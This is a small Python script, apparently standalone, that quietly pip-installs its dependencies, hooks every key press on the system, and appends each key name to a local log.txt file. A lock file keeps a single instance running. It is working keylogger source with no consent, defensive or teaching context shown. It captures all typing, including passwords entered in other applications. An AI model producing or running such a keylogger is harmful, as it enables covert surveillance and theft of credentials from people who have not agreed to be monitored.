import subprocess
import os
import sys

def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install("psutil")
install("keyboard")
try:
    import psutil
    import keyboard
except:
    print('error during loading modules.')

LOCK_FILE = "app.lock"

def on_key_press(key):
    log = open("log.txt", "a")
    log.write(f"{key.name}\n")
    print(key.name)
    log.close()


def ensure_single_instance():
    if os.path.exists(LOCK_FILE):
        with open(LOCK_FILE, "r") as f:
            old_pid = int(f.read().strip())
        
        if psutil.pid_exists(old_pid):
            sys.exit(0)
        else:
            os.remove(LOCK_FILE)

    with open(LOCK_FILE, "w") as f:
        f.write(str(os.getpid()))

def cleanup_lock():
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)

# definitons  /|\
#----------------
# main script \|/

ensure_single_instance()

keyboard.on_press(on_key_press)
keyboard.wait('')

cleanup_lock()
